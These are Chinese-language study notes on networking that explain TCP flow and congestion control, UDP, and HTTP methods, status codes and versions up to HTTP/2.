<p>接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。<br><img src="https://camo.githubusercontent.com/f670e3a7df385079035c54d43f156e63bde8c01b320e1ee40f4060a097c4dad9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61333235336465622d386432312d343061312d616165342d3764313738653461613331392e6a7067#crop=0&crop=0&crop=1&crop=1&from=url&id=Ohc3m&margin=%5Bobject%20Object%5D&originHeight=474&originWidth=1055&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p><strong>zero window</strong><br>发送端在窗口变成 0 后，会发 ZWP(Zero Window Probe)的包给接收方，让接收方来 ack 他的 Window 尺寸，一般这个值会设置成 3 次，第次大约 30-60 秒（不同的实现可能会不一样）。如果 3 次过后还是 0 的话，有的 TCP 实现就会发 RST 把链接断了。<br>一些攻击者会在和 HTTP 建好链发完 GET 请求后，就把 Window 设置为 0，然后服务端就只能等待进行 ZWP，于是攻击者会并发大量的这样的请求，把服务器端的资源耗尽。<br>​</p>
<h3 id="拥塞控制（Congestion-Handling）"><a href="#拥塞控制（Congestion-Handling）" class="headerlink" title="拥塞控制（Congestion Handling）"></a>拥塞控制（Congestion Handling）</h3><p>如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接收，而拥塞控制是为了降低整个网络的拥塞程度。<br>​</p>
<p>发送方需要维护一个叫做拥塞窗口（Congestion Window）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。<br>​</p>
<p><img src="https://camo.githubusercontent.com/96b543c35dfc6a024897cea0354427605b9d238d7af0e8c5821c7ab0c26c2f27/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39313066363133662d353134662d343533342d383764642d3962343639396435396433312e706e67#crop=0&crop=0&crop=1&crop=1&from=url&id=yqJQ2&margin=%5Bobject%20Object%5D&originHeight=754&originWidth=1914&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h4 id="慢开始与拥塞避免"><a href="#慢开始与拥塞避免" class="headerlink" title="慢开始与拥塞避免"></a>慢开始与拥塞避免</h4><p>慢启动</p>
<ol>
<li>连接建好的开始先初始化 cwnd = 1，表明可以传一个 MSS 大小的数据。</li>
<li>每当收到一个 ACK，cwnd++; 呈<strong>线性上升</strong></li>
<li>每当过了一个 RTT，cwnd = cwnd*2; 呈<strong>指数上升</strong></li>
<li>还有一个 ssthresh（slow start threshold），是一个上限，当 cwnd &gt;= ssthresh 时，就会进入“拥塞避免算法”</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629883408119-81922613-5f45-4aef-977a-a0f86866b454.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u8931f46e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=388&originWidth=662&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=190225&status=done&style=none&taskId=u5608d952-3bf6-41f1-877e-1779167a2a7&title=" alt="image.png"><br>拥塞避免<br>一般来说 ssthresh 的值是 65535，单位是字节，当 cwnd 达到这个值时后，算法如下：</p>
<ol>
<li>收到一个 ACK 时，cwnd = cwnd + 1/cwnd</li>
<li>当每过一个 RTT 时，cwnd = cwnd + 1</li>
</ol>
<p>这样就可以避免增长过快导致网络拥塞，慢慢的增加调整到网络的最佳值。很明显，是一个<strong>线性上升</strong>的算法。</p>
<p><strong>拥塞状态</strong><br>当丢包的时候，会有两种情况：<br>​</p>
<ol>
<li>等到 RTO 超时，重传数据包。TCP 认为这种情况太糟糕，反应也很强烈。</li>
</ol>
<p>sshthresh = cwnd /2<br>cwnd 重置为 1<br>进入慢启动过程</p>
<ol start="2">
<li>进行快重传与快恢复</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629884187194-7c895fbf-2159-4143-b9aa-2c127f2214d9.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=296&id=u178459b1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=619&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=78955&status=done&style=none&taskId=ub0c6680c-f3be-4d3f-abac-ace22069cf6&title=&width=619" alt="image.png"></p>
<h4 id="快重传与快恢复"><a href="#快重传与快恢复" class="headerlink" title="快重传与快恢复"></a>快重传与快恢复</h4><p><strong>快重传</strong><br>每一个数据包都带有下一个数据包的编号。如果下一个数据包没有收到，那么 ACK 的编号就不会发生变化<br>如果发送方发现收到三个连续的重复 ACK，或者超时了还没有收到任何 ACK，就会确认丢包，从而再次发送这个包。<br><img src="https://github.com/CatcherInSky/CatcherInSky.github.io/raw/source/source/images/f61b5419-c94a-4df1-8d4d-aed9ae8cc6d5.png#crop=0&crop=0&crop=1&crop=1&from=url&id=t1Gf6&margin=%5Bobject%20Object%5D&originHeight=648&originWidth=1174&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br><strong>快恢复</strong><br>在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此执行快恢复，令 ssthresh = cwnd / 2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免<br>慢开始和快恢复的快慢指的是 cwnd 的设定值，而不是 cwnd 的增长速率。慢开始 cwnd 设定为 1，而快恢复 cwnd 设定为 ssthresh<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629884122178-acbcadb5-f02e-4ac8-ab54-71fa3085579c.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=304&id=u92c1f087&margin=%5Bobject%20Object%5D&name=image.png&originHeight=304&originWidth=676&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=80790&status=done&style=none&taskId=u60b31344-6706-4c6f-83e1-dc385944325&title=&width=676" alt="image.png"></p>
<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p><strong>用户数据报协议 UDP（User Datagram Protocol）</strong>是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。</p>
<h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ol>
<li><strong>面向无连接</strong></li>
</ol>
<p>UDP 不需要和 TCP 一样在发送数据前进行三次握手建立连接，只是数据报文的搬运工，不会对数据报文进行任何拆分和拼接操作。</p>
<ul>
<li>在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 头标识下是 UDP 协议，然后就传递给网络层了</li>
<li>在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作</li>
</ul>
<ol start="2">
<li><strong>头部开销小</strong>​</li>
</ol>
<p><img src="https://camo.githubusercontent.com/513fdc176a3598465859ee974e9217e2cc0f4e14dbf6c0d0cd03d611865bb3b1/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f64346333613461312d303834362d343665632d396363332d6561646466636137313235342e6a7067#crop=0&crop=0&crop=1&crop=1&from=url&id=fWuxT&margin=%5Bobject%20Object%5D&originHeight=674&originWidth=1137&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的，传输数据报文时是很高效的。<br>​</p>
<ol start="3">
<li><strong>有单播，多播，广播的功能</strong></li>
</ol>
<p>UDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 UDP 提供了单播，多播，广播的功能<br>​</p>
<ol start="4">
<li><strong>UDP 是面向报文的</strong></li>
</ol>
<p>发送方的 UDP 对应用程序交下来的报文，在添加首部后就向下交付 IP 层。UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。因此，应用程序必须选择合适大小的报文<br>​</p>
<ol start="5">
<li><strong>不可靠性</strong></li>
</ol>
<p>首先不可靠性体现在无连接上，通信都不需要建立连接，想发就发，这样的情况肯定不可靠。并且收到什么数据就传递什么数据，并且也不会备份数据，发送数据也不会关心对方是否已经正确接收到数据了。<br>UDP 没有拥塞控制，一直会以恒定的速度发送数据。可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>HTTP 无状态协议，是指协议对于交互性场景没有记忆能力。<br>每次的请求都是独立的，它的执行情况和结果与前面的请求和之后的请求时无直接关系的，它不会受前面的请求应答情况直接影响，也不会直接影响后面的请求应答情况<br>通过 cookie session 额外维护状态</p>
<h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>获取服务器的指定资源</p>
<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>提交资源到服务器 / 在服务器新建资源</p>
<h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>与 GET 方法一样，都是发出一个获取服务器指定资源的请求，但服务器只会返回 Header 而不会返回 Body。用于确认 URI 的有效性及资源更新的日期时间等。一个典型应用是下载文件时，先通过 HEAD 方法获取 Header，从中读取文件大小 Content-Length；然后再配合 Range 字段，<strong>分片</strong>下载服务器资源</p>
<h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p>替换整个目标资源</p>
<h4 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h4><p>替换目标资源的部分内容</p>
<h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>删除指定的资源</p>
<h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>用于描述目标资源的通信选项。可以用于检测服务器支持哪些 HTTP 方法，或者在 CORS 中发起一个<strong>预检</strong>请求，以检测实际请求是否可以被服务器所接受</p>
<h4 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h4><p>建立一个到由目标资源标识的服务器的隧道</p>
<h4 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h4><p>执行一个消息环回测试，返回到服务端的路径。客户端请求连接到目标服务器时可能会通过代理中转，通过 TRACE 方法可以查询发送出去的请求的一系列操作<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629945425540-f677b00b-26a8-4e36-b117-8c4c6d4464f4.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=uf6ada5fa&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1074&originWidth=1274&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=629835&status=done&style=none&taskId=u88d2d34d-d6a3-4295-96bb-a97696daced&title=" alt="image.png"></p>
<h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p><strong>幂等（</strong>Idempotent<strong>）</strong><br>一个 HTTP 方法是幂等的，指的是同样的请求执行一次与执行多次的效果是一样的。换句话说就是，幂等方法不应该具有副作用。</p>
<ul>
<li>常见的幂等方法：GET，HEAD，PUT，DELETE，OPTIONS</li>
<li>常见的非幂等方法：POST</li>
</ul>
<p>按照 RFC 规范，PUT，DELETE 和安全方法都是幂等的。同样，这也仅仅是规范，服务端实现是否幂等是无法确保的。引入幂等主要是为了处理同一个请求重复发送的情况，比如在请求响应前失去连接，如果方法是幂等的，就可以放心地重发一次请求。这也是浏览器在后退/刷新时遇到 POST 会给用户提示的原因：POST 语义不是幂等的，重复请求可能会带来意想不到的后果。<br><strong>安全（</strong>Safe<strong>）</strong><br>一个 HTTP 方法是安全的，指的是这是一个对服务器只读操作的方法，不会修改服务器数据。</p>
<ul>
<li>常见的安全方法：GET，HEAD，OPTIONS</li>
<li>常见的不安全方法：PUT，DELETE，POST</li>
</ul>
<p>所有安全的方法都是幂等的；有些不安全的方法如 DELETE 是幂等的，有些不安全的方法如 PUT 和 DELETE 则不是<br>但是这个定义只是规范，并不能保证方法的实现也是安全的，服务端的实现可能会不符合方法语义，比方说用 GET 去修改。引入安全这个概念的目的是为了方便网络爬虫和缓存，以免调用或者缓存某些不安全方法时引起某些意外的后果。User Agent（浏览器）应该在执行安全和不安全方法时做出区分对待，并给用户以提示。<br><strong>缓存（</strong>Cacheable<strong>）</strong><br>GET、HEAD<br>GET，HEAD 和某些情况下的 POST 都是可缓存的，但是绝大多数的浏览器的实现里仅仅支持 GET 和 HEAD。<br>​</p>
<h4 id="GET-POST-区别"><a href="#GET-POST-区别" class="headerlink" title="GET/POST 区别"></a>GET/POST 区别</h4><p>以下来自 w3school</p>
<blockquote>
<ul>
<li>GET 后退按钮/刷新无害，POST 数据会被重新提交（浏览器应该告知用户数据会被重新提交）。</li>
<li>GET 书签可收藏，POST 为书签不可收藏。</li>
<li>GET 能被缓存，POST 不能缓存 。</li>
<li>GET 历史参数保留在浏览器历史中。POST 参数不会保存在浏览器历史中。</li>
<li>GET 的数据在 URL 中对所有人都是可见的。POST 的数据不会显示在 URL 中。</li>
<li><del>GET 编码类型 application/x-www-form-url，POST 编码类型 encodedapplication/x-www-form-urlencoded 或 multipart/form-data。为二进制数据使用多重编码。</del></li>
<li>​</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><del>GET 对数据长度有限制，当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是 2048 个字符）。POST 无限制。GET 只允许 ASCII 字符。POST 没有限制。也允许二进制数据。</del></li>
<li><del>与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分。在发送密码或其他敏感信息时绝不要使用 GET ！POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中。</del></li>
<li>​</li>
</ul>
</blockquote>
<p>最主要的区别是语义上的区别，浏览器用 GET 请求来获取资源；用 POST 来提交表单等。<br>​</p>
<p>GET 数据有长度限制“其实是指”URL 的长度限制。HTTP 协议本身对 URL 长度并没有做任何规定。实际的限制是由客户端/浏览器以及服务器端决定的。<br>​</p>
<p>编码类型 URL 只能用 ASCII 的子集[a-zA-Z0-9$-_.+!*’(),]，它们是可以“不经编码”在 url 中使用。比如尽管空格也是 ASCII 字符，但是不能直接用在 url 里。特殊符号和中卫会被 Percent Encoding 转化成%16 位数字的序列。<br>Body 的编码由 content-type 定义。<br>​</p>
<p>但是从攻击的角度，无论是 GET 还是 POST 都不够安全，因为<strong>HTTP</strong>本身是<strong>明文协议</strong>。每个 HTTP 请求和返回的每个 byte 都会在网络上明文传播，不管是 url，header 还是 body。避免泄密的唯一手段就是 https<br>​</p>
<h4 id="关于-POST-待-100-响应再传-data"><a href="#关于-POST-待-100-响应再传-data" class="headerlink" title="关于 POST 待 100 响应再传 data"></a>关于 POST 待 100 响应再传 data</h4><p>只有在请求里带了 Expect: 100-continue header 的时候才有意义，如果超时没有收到应答，也会发送 body。</p>
<blockquote>
<p>When the request contains an Expect header field that includes a 100-continue expectation, the 100 response indicates that the server wishes to receive the request payload body, as described in Section 5.1.1. The client ought to continue sending the request and discard the 100 response.<br>If the request did not contain an Expect header field containing the 100-continue expectation, the client can simply discard this interim response.</p>
</blockquote>
<p>而实际上，不论哪一种浏览器，在发送 POST 的时候都没有带 Expect 头，server 也自然不会发 100 continue。通过抓包发现，尽管会分两次，body 就是紧随在 header 后面发送的，根本不存在『等待服务器响应』这一说。<br>发一次还是发 N 次，客户端可以很灵活的决定。因为不管怎么发都是符合 HTTP 协议的，因此我们应该视为这种优化是一种实现细节，而不用扯到 GET 和 POST 本身的区别上。更不要当个什么世纪大发现。<br><strong>​</strong></p>
<p><strong>​</strong></p>
<h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><h4 id="信息响应（100–199）"><a href="#信息响应（100–199）" class="headerlink" title="信息响应（100–199）"></a>信息响应（100–199）</h4><ul>
<li>100 Continue：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应</li>
</ul>
<h4 id="成功响应（200–299）"><a href="#成功响应（200–299）" class="headerlink" title="成功响应（200–299）"></a>成功响应（200–299）</h4><ul>
<li>200 OK</li>
<li>201 Created：该请求已成功，并因此创建了一个新的资源。这通常是在 POST 请求之后返回的响应</li>
<li>204 No Content：该请求已成功处理，但是返回的响应报文不包含实体的主体部分。通常用于只需要从客户端往服务器发送信息，而不需要返回数据时</li>
<li>206 Partial Content：服务器已经成功处理了部分 GET 请求，该请求必须包含 Range 头信息来指示客户端希望得到的内容范围。通常使用此类响应来实现断点续传，或者将一个大文档分为多个片段然后并行下载</li>
</ul>
<h4 id="重定向（300–399）"><a href="#重定向（300–399）" class="headerlink" title="重定向（300–399）"></a>重定向（300–399）</h4><ul>
<li>301 Moved Permanently：<strong>永久性重定向</strong></li>
<li>302 Found：<strong>临时性重定向</strong>。常见应用场景是通过 302 跳转将所有的 HTTP 流量重定向到 HTTPS</li>
<li>303 See Other：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源</li>
<li>304 Not Modified：如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304 响应不包含消息体</li>
<li>307 Temporary Redirect：临时重定向。307 与 302 之间的唯一区别在于，当发送重定向请求的时候，307 状态码可以确保请求方法和消息主体不会发生变化；而如果使用 302 响应状态码，一些旧客户端会错误地将请求方法转换为 GET</li>
</ul>
<h4 id="客户端错误（400–499）"><a href="#客户端错误（400–499）" class="headerlink" title="客户端错误（400–499）"></a>客户端错误（400–499）</h4><ul>
<li>400 Bad Request：请求报文中存在语法错误，或者参数有误</li>
<li>401 Unauthorized：未认证（没有登录）</li>
<li>403 Forbidden：没有权限（登录了但没有权限）</li>
<li>404 Not Found</li>
<li>405 Method Not Allowed</li>
</ul>
<h4 id="服务器错误-（500–599）"><a href="#服务器错误-（500–599）" class="headerlink" title="服务器错误 （500–599）"></a>服务器错误 （500–599）</h4><ul>
<li>500 Internal Server Error：服务器遇到了不知道如何处理的情况</li>
<li>502 Bad Gateway：网关错误，作为网关或代理角色的服务器，从上游服务器（如 tomcat、php-fpm）中接收到的响应是无效的</li>
<li>503 Service Unavailable：服务器无法处理请求，常见原因是服务器因维护或重载而停机</li>
</ul>
<h4 id="301、302、307-重定向的原理"><a href="#301、302、307-重定向的原理" class="headerlink" title="301、302、307 重定向的原理"></a>301、302、307 重定向的原理</h4><p>返回的 Header 中有一个 Location 字段指向目标 URL，浏览器会重定向到这个 URL。<br>​</p>
<h4 id="304-与缓存机制"><a href="#304-与缓存机制" class="headerlink" title="304 与缓存机制"></a>304 与缓存机制</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1628563793849-e0a836b2-d102-4a7e-9ac2-74837cbcd2c4.png#crop=0&crop=0&crop=1&crop=1&from=url&id=pbWcH&margin=%5Bobject%20Object%5D&originHeight=681&originWidth=751&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h3 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h3><h4 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h4><p>HTTP 协议以 ASCII 码传输，请求报文由<strong>请求行、请求头、和消息主体</strong>组成。如果有消息主体，那么请求头之后的空行是必须的，用来表示请求头结束：</p>
<blockquote>
<p><method> <request-URL> <version><br><headers></p>
</blockquote>
<blockquote>
<entity-body>
</blockquote>
<p><img src="https://github.com/CatcherInSky/CatcherInSky.github.io/raw/source/source/images/HTTP_RequestMessageExample.png#crop=0&crop=0&crop=1&crop=1&from=url&id=KRl1w&margin=%5Bobject%20Object%5D&originHeight=221&originWidth=656&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h4 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h4><p>HTTP 响应报文也由三部分组成：<strong>状态行、响应头、消息主体</strong>。同样的，消息主体前必须有一个空行，表示请求头结束：</p>
<blockquote>
<p><version> <status-code> <reason-phrase><br><headers></p>
</blockquote>
<blockquote>
<message-body>
</blockquote>
<p><img src="https://github.com/CatcherInSky/CatcherInSky.github.io/raw/source/source/images/HTTP_ResponseMessageExample.png#crop=0&crop=0&crop=1&crop=1&from=url&id=PRoMc&margin=%5Bobject%20Object%5D&originHeight=267&originWidth=704&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h3 id="HTTP-0-9-最初版本"><a href="#HTTP-0-9-最初版本" class="headerlink" title="HTTP 0.9 - 最初版本"></a>HTTP 0.9 - 最初版本</h3><ul>
<li>HTTP 的最初版本，请求由单行指令构成，只支持 GET 方法。</li>
</ul>
<h3 id="HTTP-1-0-构建可扩展性"><a href="#HTTP-1-0-构建可扩展性" class="headerlink" title="HTTP/1.0 - 构建可扩展性"></a>HTTP/1.0 - 构建可扩展性</h3><ul>
<li>在请求中新增了协议版本信息</li>
<li>引入了 HTTP 头的概念</li>
<li>在响应中新增了状态码</li>
<li>默认使用短连接：浏览器每请求一个静态资源，就建立一次连接，任务结束就中断连接</li>
</ul>
<p>​</p>
<h3 id="HTTP-1-1-标准化的协议"><a href="#HTTP-1-1-标准化的协议" class="headerlink" title="HTTP/1.1 - 标准化的协议"></a>HTTP/1.1 - 标准化的协议</h3><ul>
<li>默认支持<strong>长连接</strong>：在一个网页打开期间，所有网络请求都复用同一条已经建立的连接，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close，使用 Connection : Keep-Alive 可开启长连接<ul>
<li>优点：性能更好，节省频繁建立 TCP 连接、慢启动、关闭连接等的时间，整体耗时更短</li>
<li>缺点：会占用服务器的资源</li>
</ul>
</li>
<li>引入额外的<strong>缓存控制</strong>机制：如 Entity tag、If-None-Match 等更多可供选择的缓存头</li>
<li>新增了 24 个<strong>错误状态响应码</strong>，如 409（Conflict）、410（Gone）</li>
<li>引入内容协商，允许通信双方约定语言（Accept-Language）、编码（Accept-Encoding）等</li>
<li>支持响应分块（断点续传）</li>
<li>引入<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96">管线化（Pipelining）</a>：从前发送请求后需等待并收到响应，才能发送下一个请求，现在允许客户端同时并行发送多个请求<ul>
<li>优点：在收到上一个请求的响应之前就可以发出下一个请求，能够节省请求到达服务器的时间，降低通信延迟</li>
<li>缺点：服务器要遵循 HTTP/1.1 协议，必须按照客户端发送的请求顺序返回响应，可能发生队头阻塞（HOL blocking）——若上一个请求的响应迟迟没有处理完毕，则后面的响应都会被阻塞</li>
</ul>
</li>
<li>Host 头，允许不同域名配置在同一个 IP 地址上</li>
</ul>
<p>长连接、管线化都是为了让请求更短时间内结束。</p>
<p><strong>问题：</strong><br><strong>队头阻塞（Head-of-Line Blocking）</strong><br>众所周知，客户端/浏览器花费大量时间等待每个资源。由于 HTTP/1 无法通过单个连接发出并发请求，因此浏览器通常会尝试通过打开多个连接来加快进程。</p>
<p><strong>昂贵的连接（Expensive Connections）</strong><br>从计算机网络的角度来看，虽然多个连接是有帮助的，但每打开一个连接都非常昂贵。所以，现代浏览器将 HTTP/1.1 连接数限制为最多 6-8 个。由于许多网站现在需要 80 个或更多资源，因此这些限制会产生严重的性能瓶颈。</p>
<p><strong>HTTP 管线化（HTTP Pipelining）</strong><br>HTTP/1.1 尝试使用 HTTP 管线化的技术来纠正性能瓶颈。然而，当有一个大的或慢的响应的时候，它仍然会阻塞随后的其他响应（也就是说，还是会出现线头阻塞的现象）。HTTP 管线化很难进行部署。没有现代浏览器支持 HTTP 管线化，因为许多中介和服务器无法正确处理它。</p>
<h3 id="HTTP-2-0-为了更优异的表现"><a href="#HTTP-2-0-为了更优异的表现" class="headerlink" title="HTTP/2.0 - 为了更优异的表现"></a>HTTP/2.0 - 为了更优异的表现</h3><h4 id="Header-压缩"><a href="#Header-压缩" class="headerlink" title="Header 压缩"></a>Header 压缩</h4><p>HTTP/1.1 每次通信都会携带 Header 信息用于描述资源属性。但 headers 在一系列请求中常常是相似的。HTTP/2.0 中，对于 Header 中相同的数据，不会在每次通信中重新发送，而是采用追加或替换的方式。<br>具体实现上，HTTP/2.0 在客户端和服务端之间共同维护一个 Header 表，存储之前发送的 key-value 对。Header 表在 HTTP/2.0 的连接期间始终存在。<br>Header 压缩可以减少每次通信的数据量，提高传输速度。<br>​</p>
<h4 id="服务端推送"><a href="#服务端推送" class="headerlink" title="服务端推送"></a>服务端推送</h4><p>服务器可以对一个客户端请求发送多个响应。服务器向客户端推送资源无需客户端明确的请求。<br>服务端根据客户端的请求，提前推送额外的资源给客户端。比如在发送页面 HTML 时主动推送其它 CSS/JS 资源，而不用等到浏览器解析到相应位置，发起请求再响应。<br>服务端推送可以减轻数据传输的冗余步骤，同时加快页面响应速度，提升用户体验。</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="二进制分帧"><a href="#二进制分帧" class="headerlink" title="二进制分帧"></a>二进制分帧</h4><p>HTTP/1.x 使用文本格式传输数据。HTTP/2.0 在将所有传输信息分割为若干个帧，采用<strong>二进制格式</strong>进行编码。<br>具体实现上，是在应用层（HTTP）和传输层（TCP）之间增加一个二进制分帧层。每个请求对应一个<strong>流</strong>，有一个唯一的整数标识符。HTTP/1.x 的报文会被拆分为一个或多个帧，每个帧有序列号，以及自己所述的流的标识符，接收端自行合并。<br>二进制分帧采用更高效的编码协议，提升了传输效率。同时，二进制分帧也为多路复用提供了基础。</p>
<h4 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h4><p>HTTP/1.x 有<strong>顺序</strong>和<strong>阻塞</strong>约束：</p>
<ul>
<li>顺序：服务端必须按照客户端请求到来的顺序，串行返回数据<ul>
<li>即使 HTTP/1.1 允许通过同一个连接发起多个请求，也无法真正并行传输</li>
</ul>
</li>
<li>阻塞：浏览器会限制每个域名下最多同时发起的 6 个连接，超过该数量的连接会被阻塞，以下是常见的优化方法：<ul>
<li>使用多个域名（比如 CDN）来提高浏览器的下载速度</li>
<li>将多个 JS 文件、CSS 文件等打包成一个文件，将多个小图片合并为雪碧图，减少 HTTP 请求数</li>
</ul>
</li>
</ul>
<p>HTTP/2.0 引入了多路复用，通过同一个连接发起多个请求，服务端可以并行地传输数据。基于二进制分帧层，HTTP/2.0 可以<strong>同时交错发送多个消息中的帧</strong>，接收端可以根据帧中的流标识符和顺序标识，重新组装数据。<br>多路复用使用同一个 TCP 连接并发处理同一域名下的所有请求，可以减少 TCP 建立连接带来的时延。此外多路复用代替了 HTTP/1.x 中的顺序和阻塞机制，实现了真正的并行传输，可以避免 HTTP/1.x 中的队头阻塞问题，极大的提高传输效率。</p>
<h4 id="切换"><a href="#切换" class="headerlink" title="切换"></a>切换</h4><p>支持 HTTP 2.0 的浏览器可以在 TLS 会话层自发完成和服务端的协议协商以确定是否使用 HTTP 2.0 通信。其原理是 TLS 1.2 中引入了扩展字段，以允许协议的扩展，其中 ALPN 协议（Application Layer Protocol Negotiation, 应用层协议协商, 前身是 NPN）用于客户端和服务端的协议协商过程。 服务端使用 ALPN，监听 443 端口默认提高 HTTP 1.1，并允许协商其他协议，比如 SPDY 和 HTTP 2.0。 比如，客户端在 TLS 握手 Client Hello 阶段表明自身支持 HTTP 2.0<br><img src="https://github.com/CatcherInSky/CatcherInSky.github.io/raw/source/source/images/20170406154122927.png#crop=0&crop=0&crop=1&crop=1&from=url&id=vCcuh&margin=%5Bobject%20Object%5D&originHeight=543&originWidth=701&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>服务端收到后，响应 Server Hello，表示自己也支持 HTTP 2.0。双方开始 HTTP 2.0 通信。<br><img src="https://github.com/CatcherInSky/CatcherInSky.github.io/raw/source/source/images/20170406154450854.png#crop=0&crop=0&crop=1&crop=1&from=url&id=rLmJp&margin=%5Bobject%20Object%5D&originHeight=563&originWidth=720&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>TCP 协议固有的问题，无论应用层的 HTTP/2 再怎么设计都无法摆脱。<br><strong>队头阻塞</strong><br>HTTP/2 多个请求是跑在一个 TCP 连接中的，那么当 TCP 丢包时，整个 TCP 都要等待重传，那么就会阻塞该 TCP 连接中的所有请求。<br>因为 TCP 是字节流协议，TCP 层必须保证收到的字节数据是完整且有序的，如果序列号较低的 TCP 段在网络传输中丢失了，即使序列号较高的 TCP 段已经被接收了，应用层也无法从内核中读取到这部分数据，从 HTTP 视角看，就是请求被阻塞了。<br>​</p>
<p><strong>TCP 与 TLS 的握手延迟+拥塞控制慢启动</strong><br><strong>​</strong></p>
<p>发起 HTTP 请求时，需要经过 TCP 三次握手和 TLS 四次握手（TLS 1.2）的过程，因此共需要 3 个 RTT 的时延才能发出请求数据。<br><strong>​</strong></p>
